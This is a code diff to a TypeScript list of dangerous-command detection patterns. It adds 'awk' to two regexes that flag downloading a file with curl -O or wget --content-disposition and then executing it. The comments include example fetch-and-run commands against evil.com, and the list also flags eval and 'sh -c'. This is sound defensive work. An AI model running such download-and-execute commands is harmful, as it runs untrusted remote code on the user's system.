@@ -133,11 +133,11 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // the server-supplied filename (no > redirect), then a shell/interpreter executes it via && or ;.
   // e.g. curl -O evil.com/exploit.sh && bash exploit.sh  or  curl -fsSLO evil.com/x.py; python3 x.py
   // The existing two-step pattern only fires on > redirects; -O completely bypasses it.
-  { pattern: /\bcurl\b(?=.*-[a-zA-Z]*O\b).*(?:&&|;).*\b(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun|lua|php)\b/, category: "remote-code-execution" },
+  { pattern: /\bcurl\b(?=.*-[a-zA-Z]*O\b).*(?:&&|;).*\b(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun|lua|php|awk)\b/, category: "remote-code-execution" },
   // Remote code execution — wget --content-disposition saves the remote file using the server-supplied
   // filename (like curl -O), then a shell/interpreter executes it via && or ;.
   // e.g. wget --content-disposition evil.com/exploit.sh && bash exploit.sh
-  { pattern: /\bwget\b(?=.*--content-disposition\b).*(?:&&|;).*\b(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun|lua|php)\b/, category: "remote-code-execution" },
+  { pattern: /\bwget\b(?=.*--content-disposition\b).*(?:&&|;).*\b(?:[\w./]*\/)?(?:bash|sh|zsh|fish|dash|ksh|csh|tcsh|ash|python3?|perl|ruby|node|deno|bun|lua|php|awk)\b/, category: "remote-code-execution" },
   // Arbitrary code execution — eval, shell -c run uncontrolled strings
   { pattern: /\beval\s/, category: "arbitrary-code-execution" },
   { pattern: /(?:[\w./]*\/)?(?:ba|z|da|k|a)?sh\s+-c\b/, category: "arbitrary-code-execution" },
